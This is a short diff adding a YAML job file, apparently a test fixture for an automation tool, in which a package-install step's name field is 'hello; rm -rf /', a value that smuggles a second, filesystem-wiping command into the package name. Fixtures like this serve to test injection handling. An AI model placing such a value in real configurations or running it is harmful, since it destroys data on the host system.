@@ -1,0 +1,7 @@
+jobs:
+  j:
+    target: local
+    steps:
+      - uses: apt.package
+        with:
+          name: "hello; rm -rf /"
